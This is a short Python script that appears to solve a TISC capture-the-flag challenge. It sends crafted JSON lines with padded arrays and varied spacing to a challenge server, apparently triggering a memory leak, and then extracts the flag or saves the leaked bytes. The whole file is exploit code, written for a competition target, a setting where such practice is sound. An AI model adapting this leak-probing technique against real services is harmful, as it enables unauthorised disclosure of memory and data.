#!/usr/bin/env python3
import json
import socket
import time
import sys

HOST = ('chals.tisc25.ctf.sg', 51728)

CASES = [
    {'val': 100, 'comma_space': 0, 'tr': 45},
    {'val': 100, 'comma_space': 0, 'tr': 46},
    {'val': 100, 'comma_space': 1, 'tr': 0},
]


def build_line(vals, comma_space=0, trail_spaces=0):
    sep = ',' + (' ' * comma_space)
    body = '[' + sep.join(str(x) for x in vals) + ']'
    return '{"slot": 1, "data": ' + body + '}' + (' ' * trail_spaces)


def run_case(case):
    val = case['val']; cs = case['comma_space']; tr = case['tr']
    base_vals = [val] * 44
    second = build_line(base_vals + [65,11,0], cs, tr)
    third  = build_line(base_vals + [75,37,0], cs, tr)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    s.connect(HOST)
    resps = []
    try:
        s.sendall((json.dumps({"slot":1, "data":[69,2,0]})+'\n').encode()); resps.append(s.recv(16384))
        time.sleep(0.15)
        s.sendall((second+'\n').encode()); resps.append(s.recv(16384))
        time.sleep(0.15)
        s.sendall((third+'\n').encode()); resps.append(s.recv(16384))
        time.sleep(0.15)
        s.sendall((json.dumps({"slot":0})+'\n').encode()); resps.append(s.recv(131072))
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()
    return resps


def main():
    for idx, c in enumerate(CASES):
        print('CASE', idx+1, c)
        resps = run_case(c)
        print('r1:', resps[0][:120])
        print('r2:', resps[1][:120])
        print('r3:', resps[2][:120])
        print('r4_len:', len(resps[3]))
        if b'TISC{' in resps[3]:
            start = resps[3].find(b'TISC{'); end = resps[3].find(b'}', start)
            if end != -1: print('FLAG:', resps[3][start:end+1].decode(errors='ignore')); sys.exit(0)
        if b'[' in resps[3] and b']' in resps[3]:
            try:
                arr = resps[3][resps[3].index(b'['): resps[3].index(b']')+1]
                vals = json.loads(arr)
                sflag = ''.join(chr(x) for x in vals if isinstance(x,int) and 0 <= x < 256 and x != 0)
                print('ARRAY_DECODE:', sflag)
                if 'TISC{' in sflag:
                    print('FLAG:', sflag[sflag.index('TISC{'):sflag.index('}', sflag.index('TISC{'))+1])
                    sys.exit(0)
            except Exception:
                pass
        if len(resps[3]) > 2000:
            with open(f'leak_case{idx+1}.bin', 'wb') as f:
                f.write(resps[3])
            print('Saved leak to leak_case%d.bin' % (idx+1))
        time.sleep(0.6)
    print('No flag. Saved any large leaks to files.')
    sys.exit(1)

if __name__ == '__main__':
    main()
